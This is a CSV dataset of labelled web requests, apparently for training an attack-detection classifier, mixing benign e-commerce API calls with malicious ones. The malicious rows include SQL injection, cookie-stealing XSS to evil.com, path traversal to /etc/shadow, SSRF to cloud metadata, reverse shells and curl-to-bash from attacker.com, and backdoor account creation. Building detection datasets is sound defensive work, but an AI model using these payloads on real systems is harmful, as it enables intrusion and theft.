"text","label"
"Authorization: Bearer validtoken531","0"
"exec=| cat /etc/passwd","1"
"GET /api/products?status=pending&priority=high","0"
"q=smartphone&brand=samsung","0"
"GET /health HTTP/1.1","0"
"user=ahmed&filter=active","0"
"GET /health HTTP/1.1","0"
"category=tablets page=4","0"
"user_id=30&action=view","0"
"POST /api/login username=1'; INSERT INTO users VALUES('hacker','pass')-- password=test","1"
"username=administrator&password=qwerty","1"
"POST /api/login username=1' /*!OR*/ 1=1-- password=test","1"
"GET /health HTTP/1.1","0"
"Authorization: Bearer validtoken120","0"
"GET /api/search?q=<audio src=1 onerror=alert(1)>","1"
"title=<script >alert(1)</script >","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"page=21&limit=10","0"
"GET /api/swagger.json HTTP/1.1","1"
"username=root&password=123456","1"
"search=phone","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"Authorization: Bearer validtoken183","0"
"/etc/passwd%00","1"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"PUT /settings?category=electronics&page=1","0"
"order_id=ORD-5709 status=confirmed","0"
"brute force attempt on login endpoint from single ip","1"
"password spray attack detected multiple users","1"
"Authorization: Bearer validtoken452","0"
"user_id=981&action=view","0"
"message=<audio src=1 onerror=alert(1)>","1"
"POST /api/login body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"order_id=ORD-1195 status=confirmed","0"
"username=admin&password=1234567890","1"
"Authorization: Bearer validtoken159","0"
"cmd=| cat /etc/passwd","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"category=audio page=3","0"
"User-Agent: masscan/1.3","1"
"order_id=ORD-2902 status=confirmed","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"user_id=143&action=view","0"
"PUT /api/orders User-Agent: PostmanRuntime/7.36.0","0"
"search=1'%09OR%091=1--","1"
"GET /api/users?id=' OR 1=1--","1"
"....//....//etc/passwd","1"
"user=ahmed&filter=active","0"
"user_id=322&action=view","0"
"GET /api/users?id=123&format=json","0"
"category=laptops page=8","0"
"include=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"POST /dashboard body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /api/data User-Agent: PostmanRuntime/7.36.0","0"
"name=Omar email=403@mail.com","0"
"User-Agent: masscan/1.3","1"
"exec=; cat /etc/shadow","1"
"GET /server-status HTTP/1.1","1"
"GET /api/search User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"cmd=|| nc -e /bin/sh attacker.com 4444","1"
"POST /profile?category=electronics&page=1","0"
"username=user&password=1234567890","1"
"search=phone","0"
"PUT /api/users User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"Authorization: Bearer validtoken540","0"
"url=http://10.0.0.1","1"
"../../../etc/shadow","1"
"Authorization: Bearer validtoken907","0"
"page=44&limit=50","0"
"ping=& ipconfig","1"
"GET /profile/1438","0"
"POST /api/feedback body=<div onmouseover=alert(1)>hover</div>","1"
"search=' UNION SELECT NULL--","1"
"category=electronics&page=1","0"
"host=| uname -a","1"
"user_id=560&action=view","0"
"username=1'||'1'='1","1"
"order_id=ORD-7247 status=confirmed","0"
"cmd=`id`","1"
"GET /health HTTP/1.1","0"
"host=|| nc -e /bin/sh attacker.com 4444","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /health HTTP/1.1","0"
"Authorization: Bearer validtoken167","0"
"category=electronics&page=1","0"
"id=1'/**/OR/**/1=1--","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"Authorization: Bearer validtoken353","0"
"GET /health HTTP/1.1","0"
"Authorization: Bearer validtoken602","0"
"ping=& net user hacker Password1 /add","1"
"page=43&limit=10","0"
"GET /api/data/5064","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"page=39&limit=50","0"
"include=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"POST /api/login username=1' AND 1=1 UNION SELECT 1-- - password=test","1"
"order_id=ORD-4021 status=confirmed","0"
"Authorization: Bearer validtoken987","0"
"GET /api/users/3390","0"
"POST /api/orders body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"search=phone","0"
"name=Lina email=212@mail.com","0"
"order_id=ORD-5153 status=confirmed","0"
"GET /profile/3403","0"
"1' OR 0x31=0x31--","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"id=admin'--","1"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"order_id=' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"GET /phpmyadmin HTTP/1.1","1"
"filename=| uname -a","1"
"category=electronics&page=1","0"
"DELETE /api/users User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /server-status HTTP/1.1","1"
"name=Omar email=682@mail.com","0"
"url=gopher://127.0.0.1:25/","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/swagger.json HTTP/1.1","1"
"user_id=664&action=view","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"ping=`curl -s http://attacker.com/shell.sh | bash`","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /dashboard/4001","0"
"name=javascript:alert(document.cookie)","1"
"GET /settings User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"POST /api/products User-Agent: python-requests/2.31.0","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=' UNION SELECT username,password FROM users--","1"
"GET /profile/3220","0"
"GET /api/search?q=<img src=`javascript:alert(1)`>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"url=http://127.0.0.1/admin","1"
"page=21&limit=10","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"PUT /dashboard?date=2024-01-15&type=order","0"
"; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"order_id=ORD-5631 status=confirmed","0"
"user_id=958&action=view","0"
"search=headphones","0"
"POST /api/orders User-Agent: python-requests/2.31.0","0"
"multiple failed login attempts detected for admin","1"
"GET file:///etc/passwd","1"
"Authorization: Bearer validtoken100","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"url=dict://127.0.0.1:11211/","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"<iframe src=javascript:alert(1)>","1"
"POST /settings body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"ping=$(curl -s http://attacker.com/shell.sh)","1"
"user_id=535&action=view","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"category=phones page=3","0"
"GET /api/files?name=../../../var/www/html/config.php","1"
"url=file:///etc/passwd","1"
"GET /health HTTP/1.1","0"
"repeated authentication failure admin account locked","1"
"fetch=http://internal-service:8080/secret","1"
"GET /.env HTTP/1.1","1"
"PUT /api/data?category=electronics&page=1","0"
"GET /dashboard User-Agent: python-requests/2.31.0","0"
"GET /profile/8640","0"
"GET /robots.txt scan probe reconnaissance","1"
"order_id=ORD-5537 status=confirmed","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"message=<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"POST /api/login body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /profile/5722","0"
"GET /api/users?id=' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--","1"
"category=phones page=1","0"
"category=audio page=10","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=http://192.168.1.1","1"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"host=$(curl -s http://attacker.com/shell.sh)","1"
"GET /admin HTTP/1.1","1"
"Authorization: Bearer validtoken943","0"
"order_id=1' oR '1'='1","1"
"Authorization: Bearer validtoken582","0"
"id=1 OR 1=1","1"
"url=gopher://127.0.0.1:25/","1"
"user=ahmed&filter=active","0"
"GET /settings/1562","0"
"GET /api/files?name=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"path=../../../../etc/passwd","1"
"multiple failed login attempts detected for admin","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Authorization: Bearer validtoken730","0"
"; python -c 'import socket,subprocess'","1"
"category=audio page=3","0"
"Authorization: Bearer validtoken514","0"
"exec=; ls -la","1"
"POST /api/data body=command& net user hacker Password1 /add","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"name=Omar email=405@mail.com","0"
"Authorization: Bearer validtoken815","0"
"User-Agent: Nmap Scripting Engine","1"
"name=Omar email=924@mail.com","0"
"page=44&limit=20","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=ORD-7858 status=confirmed","0"
"username=administrator&password=admin","1"
"search=laptop&sort=price","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /api/users/5923","0"
"GET /api/search User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"../../../../var/log/apache2/access.log","1"
"GET /api/products User-Agent: python-requests/2.31.0","0"
"POST /api/feedback body=<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"host=| wget http://attacker.com/shell.sh","1"
"name=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"POST /api/data?limit=20&offset=0","0"
"PUT /profile User-Agent: python-requests/2.31.0","0"
"include=../../../../proc/self/environ","1"
"category=laptops page=3","0"
"search=tablet","0"
"id=123&format=json","0"
"<svg onload=alert(1)>","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"DELETE /api/data?q=smartphone&brand=samsung","0"
"user=1'/**/OR/**/1=1--","1"
"user_id=934&action=view","0"
"url=http://10.0.0.1","1"
"GET /wp-admin HTTP/1.1","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=headphones","0"
"DELETE /api/data User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"search=phone","0"
"category=audio page=5","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"Authorization: Bearer validtoken902","0"
"filename=& net user hacker Password1 /add","1"
"name=<audio src=1 onerror=alert(1)>","1"
"category=phones page=5","0"
"file=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"exec=& ipconfig","1"
"POST /api/login username=1; DROP TABLE users-- password=test","1"
"page=17&limit=50","0"
"Authorization: Bearer validtoken273","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"filename=& whoami","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"Authorization: Bearer validtoken561","0"
"; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"Authorization: Bearer validtoken885","0"
"GET /api/products/7515","0"
"id=1'%09OR%091=1--","1"
"GET /api/login/8835","0"
"search=laptop","0"
"PUT /api/users User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"category=tablets page=4","0"
"category=electronics&page=1","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"page=33&limit=20","0"
"name=<script >alert(1)</script >","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/login body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"DELETE /api/users?date=2024-01-15&type=order","0"
"order_id=ORD-8564 status=confirmed","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /robots.txt scan probe reconnaissance","1"
"order_id=ORD-8523 status=confirmed","0"
"page=23&limit=10","0"
"date=2024-01-15&type=order","0"
"POST /api/search User-Agent: PostmanRuntime/7.36.0","0"
"GET /api/login/647","0"
"repeated authentication failure admin account locked","1"
"Authorization: Bearer validtoken742","0"
"GET /health HTTP/1.1","0"
"POST /api/login body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"POST /api/feedback body=<div onmouseover=alert(1)>hover</div>","1"
"GET /admin HTTP/1.1","1"
"user_id=602&action=view","0"
"brute force attempt on login endpoint from single ip","1"
"GET /api/search?q=""><script>alert(1)</script>","1"
"User-Agent: Nmap Scripting Engine","1"
"username=root&password=password123","1"
"page=46&limit=50","0"
"message=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"Authorization: Bearer validtoken528","0"
"POST /api/search body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"user=' UNION SELECT NULL,NULL--","1"
"category=phones page=4","0"
"GET %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"user_id=55&action=view","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /health HTTP/1.1","0"
"search=tablet","0"
"POST /api/orders body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /config.php HTTP/1.1","1"
"DELETE /api/orders?date=2024-01-15&type=order","0"
"path=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"category=audio page=3","0"
"cmd=`curl -s http://attacker.com/shell.sh | bash`","1"
"PUT /settings?date=2024-01-15&type=order","0"
"order_id=ORD-2938 status=confirmed","0"
"Authorization: Bearer validtoken217","0"
"Authorization: Bearer validtoken449","0"
"url=gopher://127.0.0.1:25/","1"
"name=Lina email=244@mail.com","0"
"user_id=75&action=view","0"
"exec=$(curl -s http://attacker.com/shell.sh)","1"
"url=file:///etc/passwd","1"
"message=<audio src=1 onerror=alert(1)>","1"
"password spray attack detected multiple users","1"
"order_id=ORD-1703 status=confirmed","0"
"date=2024-01-15&type=order","0"
"comment=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"search=headphones","0"
"POST /profile User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /api/users/2652","0"
"Authorization: Bearer validtoken491","0"
"GET /api/users/4030","0"
"Authorization: Bearer validtoken379","0"
"exec=`curl -s http://attacker.com/shell.sh | bash`","1"
"path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"user_id=315&action=view","0"
"page=34&limit=20","0"
"user=' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"category=tablets page=8","0"
"GET /api/files?name=php://filter/convert.base64-encode/resource=config.php","1"
"page=4&limit=50","0"
"q=smartphone&brand=samsung","0"
"Authorization: Bearer validtoken688","0"
"order_id=ORD-2923 status=confirmed","0"
"GET /api/login/6435","0"
"GET /api/files?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"file=php://filter/convert.base64-encode/resource=config.php","1"
"GET /api/files?name=../../../../etc/shadow","1"
"GET /api/search?q=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"search=tablet","0"
"order_id=ORD-1220 status=confirmed","0"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"status=pending&priority=high","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"category=tablets page=9","0"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"repeated authentication failure admin account locked","1"
"brute force attempt on login endpoint from single ip","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/data/5505","0"
"name=Omar email=642@mail.com","0"
"GET /dashboard?date=2024-01-15&type=order","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /api/products User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"search=laptop","0"
"name=Lina email=133@mail.com","0"
"order_id='; EXEC master..xp_dirtree '\\\\attacker.com\\share'--","1"
"name=Ahmed email=551@mail.com","0"
"GET ../../.git/config","1"
"username=root&password=123456","1"
"user_id=710&action=view","0"
"GET /api/orders?date=2024-01-15&type=order","0"
"GET /phpmyadmin HTTP/1.1","1"
"POST /api/data body=command| uname -a","1"
"search=headphones","0"
"url=http://127.0.0.1/admin","1"
"GET /config.php HTTP/1.1","1"
"POST /api/search User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /admin HTTP/1.1","1"
"order_id=ORD-1401 status=confirmed","0"
"page=1&limit=20","0"
"fetch=http://internal-service:8080/secret","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"url=http://192.168.1.1","1"
"url=http://10.0.0.1","1"
"GET /dashboard/8583","0"
"username=admin&password=admin","1"
"date=2024-01-15&type=order","0"
"GET /phpmyadmin HTTP/1.1","1"
"id=' OR '1'='1'--","1"
"description=%3Cscript%3Ealert(1)%3C/script%3E","1"
"order_id=ORD-9460 status=confirmed","0"
"POST /api/login User-Agent: python-requests/2.31.0","0"
"user_id=600&action=view","0"
"DELETE /api/orders?id=123&format=json","0"
"search=headphones","0"
"PUT /settings User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"user_id=815&action=view","0"
"PUT /dashboard?date=2024-01-15&type=order","0"
"PUT /api/users User-Agent: PostmanRuntime/7.36.0","0"
"POST /dashboard?limit=20&offset=0","0"
"username=root&password=password123","1"
"GET /profile/1302","0"
"GET /admin HTTP/1.1","1"
"POST /api/feedback body=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"limit=20&offset=0","0"
"include=file:///etc/passwd","1"
"POST /api/users User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /health HTTP/1.1","0"
"User-Agent: Nmap Scripting Engine","1"
"POST /api/users body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"POST /api/login username=' OR ''=' password=test","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"exec=; ls -la","1"
"POST /api/search body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"name=Sara email=572@mail.com","0"
"POST /api/feedback body=<script>alert('XSS')</script>","1"
"path=../../../etc/shadow","1"
"search=headphones","0"
"order_id=ORD-2508 status=confirmed","0"
"file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /dashboard?category=electronics&page=1","0"
"DELETE /api/products User-Agent: axios/1.6.0","0"
"message=<scr ipt>alert(1)</scr ipt>","1"
"GET /health HTTP/1.1","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"login attempt failed username admin invalid credentials","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"fetch=http://internal-service:8080/secret","1"
"category=laptops page=4","0"
"category=laptops page=5","0"
"GET /api/data?q=smartphone&brand=samsung","0"
"user_id=717&action=view","0"
"DELETE /api/data User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"category=tablets page=7","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"host=; cat /etc/shadow","1"
"DELETE /settings?date=2024-01-15&type=order","0"
"name=Nour email=568@mail.com","0"
"search=phone","0"
"Authorization: Bearer validtoken629","0"
"description=';alert(String.fromCharCode(88,83,83))//","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /console HTTP/1.1","1"
"cmd=& net user hacker Password1 /add","1"
"user_id=243&action=view","0"
"GET /api/data?q=smartphone&brand=samsung","0"
"GET /health HTTP/1.1","0"
"Authorization: Bearer validtoken977","0"
"GET /api/data/7750","0"
"GET /api/products/9498","0"
"multiple failed login attempts detected for admin","1"
"username=root&password=batman","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"url=file:///etc/passwd","1"
"& whoami","1"
"ping=$(curl -s http://attacker.com/shell.sh)","1"
"multiple failed login attempts detected for admin","1"
"POST /api/data body=command& net user hacker Password1 /add","1"
"search=headphones","0"
"repeated authentication failure admin account locked","1"
"status=pending&priority=high","0"
"ping=& ipconfig","1"
"GET /api/search?q=<details open ontoggle=alert(1)>","1"
"order_id=ORD-9969 status=confirmed","0"
"GET /api/login/7385","0"
"name=Nour email=752@mail.com","0"
"filename=& net user hacker Password1 /add","1"
"url=http://192.168.1.1","1"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"date=2024-01-15&type=order","0"
"; cat /etc/shadow","1"
"order_id=ORD-9919 status=confirmed","0"
"search=phone","0"
"order_id=1' OR 0x31=0x31--","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"category=laptops page=1","0"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"Authorization: Bearer validtoken686","0"
"GET /api/login/5803","0"
"GET /health HTTP/1.1","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"POST /api/orders body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"q=smartphone&brand=samsung","0"
"search=<svg onload=alert(1)>","1"
"user_id=62&action=view","0"
"user_id=819&action=view","0"
"search=<script>document.location='https://evil.com/steal?c='+document.cookie</script>","1"
"POST /api/products body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"id=123&format=json","0"
"path=../../../../etc/shadow","1"
"GET /.env HTTP/1.1","1"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"DELETE /settings User-Agent: PostmanRuntime/7.36.0","0"
"include=..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"DELETE /api/orders?limit=20&offset=0","0"
"search=laptop","0"
"status=pending&priority=high","0"
"DELETE /dashboard User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"DELETE /api/users?limit=20&offset=0","0"
"order_id=ORD-5279 status=confirmed","0"
"name=Nour email=682@mail.com","0"
"DELETE /profile User-Agent: axios/1.6.0","0"
"POST /settings body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/orders?limit=20&offset=0","0"
"path=file:///etc/passwd","1"
"include=php://filter/convert.base64-encode/resource=config.php","1"
"POST /api/login username=' OR ''=' password=test","1"
"GET /robots.txt scan probe reconnaissance","1"
"GET /phpmyadmin HTTP/1.1","1"
"search=laptop","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"title=<div onmouseover=alert(1)>hover</div>","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"category=phones page=1","0"
"order_id=ORD-2779 status=confirmed","0"
"password spray attack detected multiple users","1"
"exec=| cat /etc/passwd","1"
"GET /api/files?name=../../../../etc/shadow","1"
"user_id=32&action=view","0"
"search=laptop","0"
"POST /api/feedback body=<input onfocus=alert(1) autofocus>","1"
"path=../../../../var/log/apache2/access.log","1"
"order_id=ORD-8613 status=confirmed","0"
"name=Omar email=463@mail.com","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /profile/3221","0"
"POST /api/products body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"date=2024-01-15&type=order","0"
"GET /profile/6006","0"
"GET /server-status HTTP/1.1","1"
"category=phones page=9","0"
"repeated authentication failure admin account locked","1"
"Authorization: Bearer validtoken873","0"
"url=http://10.0.0.1","1"
"url=http://192.168.1.1","1"
"GET /api/products/35","0"
"url=dict://127.0.0.1:11211/","1"
"search=tablet","0"
"search=headphones","0"
"user_id=436&action=view","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"search=phone","0"
"DELETE /api/data?date=2024-01-15&type=order","0"
"PUT /api/login User-Agent: python-requests/2.31.0","0"
"%3Cscript%3Ealert(1)%3C/script%3E","1"
"`id`","1"
"search=headphones","0"
"category=electronics&page=1","0"
"repeated authentication failure admin account locked","1"
"message=<img src=`javascript:alert(1)`>","1"
"GET /api/files?name=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"url=http://192.168.1.1","1"
"multiple failed login attempts detected for admin","1"
"GET /api/swagger.json HTTP/1.1","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /health HTTP/1.1","0"
"../../../.env","1"
"multiple failed login attempts detected for admin","1"
"date=2024-01-15&type=order","0"
"url=http://10.0.0.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"username=administrator&password=password123","1"
"GET /api/files?name=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"& net user hacker Password1 /add","1"
"brute force attempt on login endpoint from single ip","1"
"POST /api/feedback body=<script >alert(1)</script >","1"
"POST /api/feedback body=<textarea onfocus=alert(1) autofocus>","1"
"GET /backup.sql HTTP/1.1","1"
"category=electronics&page=1","0"
"file=file:///etc/passwd","1"
"search=' UNION SELECT username,password FROM users--","1"
"user_id=733&action=view","0"
"PUT /api/data User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /actuator/env HTTP/1.1","1"
"1 OR 1=1","1"
"file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"order_id=ORD-3963 status=confirmed","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"user_id=937&action=view","0"
"POST /api/login username=' OR 1=1 LIMIT 1-- password=test","1"
"POST /api/feedback body=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"id=123&format=json","0"
"order_id=ORD-1311 status=confirmed","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"cmd=$(whoami)","1"
"Authorization: Bearer validtoken540","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /profile?date=2024-01-15&type=order","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
